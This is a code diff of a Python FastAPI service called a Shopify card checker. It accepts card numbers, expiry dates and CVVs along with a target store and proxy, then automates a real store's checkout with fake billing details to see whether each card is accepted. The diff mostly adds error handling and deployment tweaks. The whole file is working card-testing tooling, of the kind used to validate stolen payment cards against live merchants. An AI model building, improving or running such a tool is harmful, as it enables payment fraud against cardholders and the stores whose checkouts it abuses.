@@ -1,10 +1,7 @@
-# api.py – Fast Shopify Card Checker (Clean Lifespan)
+# api.py – Robust Shopify Checker
 import os
 import re
 import json
-import random
-import asyncio
-import time
 from typing import Optional
 from urllib.parse import urljoin
 from contextlib import asynccontextmanager
@@ -13,17 +10,15 @@ import httpx
 from fastapi import FastAPI, Query, HTTPException
 from fastapi.responses import JSONResponse
 
-# ─── Lifespan for proper shutdown ──────────────────────────────────
+# ─── Lifespan ────────────────────────────────────────────────────────
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    # Startup: nothing needed
     yield
-    # Shutdown: close HTTP client
     await client.aclose()
 
 app = FastAPI(title="Shopify Checker API", lifespan=lifespan)
 
-# ─── HTTP client with connection pooling ──────────────────────────
+# ─── HTTP client ────────────────────────────────────────────────────
 client = httpx.AsyncClient(
     timeout=httpx.Timeout(30.0, connect=10.0),
     limits=httpx.Limits(max_keepalive_connections=100, max_connections=200),
@@ -43,13 +38,13 @@ def format_proxy(proxy: Optional[str]) -> Optional[str]:
     if "://" in proxy:
         return proxy
     parts = proxy.split(":")
-    if len(parts) == 4:  # ip:port:user:pass
+    if len(parts) == 4:
         return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-    if len(parts) == 2:  # ip:port
+    if len(parts) == 2:
         return f"http://{parts[0]}:{parts[1]}"
     return proxy
 
-# ─── Core checker ─────────────────────────────────────────────────────
+# ─── Core checker (with full error trapping) ────────────────────────
 async def check_site(site: str, card_number: str, month: str, year: str, cvv: str, proxy: Optional[str] = None):
     if not site.startswith(('http://', 'https://')):
         site = f'https://{site}'
@@ -67,55 +62,51 @@ async def check_site(site: str, card_number: str, month: str, year: str, cvv: st
         return await session.post(url, data=data, json=json, **kwargs)
 
     try:
-        # ─── 1. Get a product variant ID ──────────────────────────
+        # ─── 1. Get product ──────────────────────────────────────────
         products_url = urljoin(site, "/products.json?limit=1")
         resp = await fetch(client, products_url)
         if resp.status_code != 200:
-            return {"status": "error", "message": "Failed to fetch products", "price": "-", "gateway": "Shopify"}
-        products = resp.json().get("products", [])
+            return {"status": "error", "message": f"Failed to fetch products (HTTP {resp.status_code})", "price": "-", "gateway": "Shopify"}
+        data = resp.json()
+        products = data.get("products", [])
         if not products:
-            return {"status": "error", "message": "No products found", "price": "-", "gateway": "Shopify"}
-        variant_id = products[0]["variants"][0]["id"]
-        price = products[0]["variants"][0]["price"]
+            return {"status": "error", "message": "No products found on this store", "price": "-", "gateway": "Shopify"}
+        variant = products[0].get("variants", [])
+        if not variant:
+            return {"status": "error", "message": "No variants found", "price": "-", "gateway": "Shopify"}
+        variant_id = variant[0]["id"]
+        price = variant[0].get("price", "0.00")
 
-        # ─── 2. Add to cart ──────────────────────────────────────
+        # ─── 2. Add to cart ──────────────────────────────────────────
         add_url = urljoin(site, "/cart/add.js")
         add_data = {"id": variant_id, "quantity": 1}
         resp = await post(client, add_url, json=add_data)
         if resp.status_code != 200:
-            return {"status": "error", "message": "Failed to add to cart", "price": "-", "gateway": "Shopify"}
+            return {"status": "error", "message": f"Failed to add to cart (HTTP {resp.status_code})", "price": price, "gateway": "Shopify"}
 
-        # ─── 3. Get checkout page ──────────────────────────────
+        # ─── 3. Load checkout ────────────────────────────────────────
         checkout_url = urljoin(site, "/checkout")
         resp = await fetch(client, checkout_url)
         if resp.status_code != 200:
-            return {"status": "error", "message": "Failed to load checkout", "price": "-", "gateway": "Shopify"}
+            return {"status": "error", "message": f"Failed to load checkout (HTTP {resp.status_code})", "price": price, "gateway": "Shopify"}
         html = resp.text
 
         token_match = re.search(r'name="authenticity_token" value="([^"]+)"', html)
         if not token_match:
-            return {"status": "error", "message": "Authenticity token not found", "price": "-", "gateway": "Shopify"}
+            return {"status": "error", "message": "Authenticity token not found", "price": price, "gateway": "Shopify"}
         token = token_match.group(1)
 
-        # ─── 4. Submit payment ────────────────────────────────────
-        first_name = "John"
-        last_name = "Doe"
-        address = "123 Main St"
-        city = "New York"
-        zip_code = "10001"
-        state = "NY"
-        country = "US"
-
+        # ─── 4. Submit payment ──────────────────────────────────────
         payment_data = {
             "authenticity_token": token,
             "checkout[email]": "john.doe@example.com",
-            "checkout[billing_address][first_name]": first_name,
-            "checkout[billing_address][last_name]": last_name,
-            "checkout[billing_address][address1]": address,
-            "checkout[billing_address][city]": city,
-            "checkout[billing_address][province]": state,
-            "checkout[billing_address][zip]": zip_code,
-            "checkout[billing_address][country]": country,
+            "checkout[billing_address][first_name]": "John",
+            "checkout[billing_address][last_name]": "Doe",
+            "checkout[billing_address][address1]": "123 Main St",
+            "checkout[billing_address][city]": "New York",
+            "checkout[billing_address][province]": "NY",
+            "checkout[billing_address][zip]": "10001",
+            "checkout[billing_address][country]": "US",
             "checkout[billing_address][phone]": "+1234567890",
             "checkout[remember_me]": "0",
             "checkout[consents][email_marketing]": "0",
@@ -171,14 +162,24 @@ async def shopify_check(
     except ValueError as e:
         raise HTTPException(status_code=400, detail=str(e))
 
-    result = await check_site(site, card_number, month, year, cvv, proxy)
-    return JSONResponse(content=result)
+    # Wrap the entire check to catch any unexpected error
+    try:
+        result = await check_site(site, card_number, month, year, cvv, proxy)
+        return JSONResponse(content=result)
+    except Exception as e:
+        return JSONResponse(
+            status_code=200,
+            content={"status": "error", "message": f"Unexpected error: {str(e)[:150]}", "price": "-", "gateway": "Shopify"}
+        )
 
-# ─── Health ───────────────────────────────────────────────────────────
+# ─── Health check ─────────────────────────────────────────────────────
 @app.get("/")
+@app.get("/health")
 async def health():
     return {"status": "ok", "service": "Shopify Checker API"}
 
+# ─── Main (for local testing) ────────────────────────────────────────
 if __name__ == "__main__":
     import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=7070)
+    port = int(os.getenv("PORT", 7070))
+    uvicorn.run(app, host="0.0.0.0", port=port)
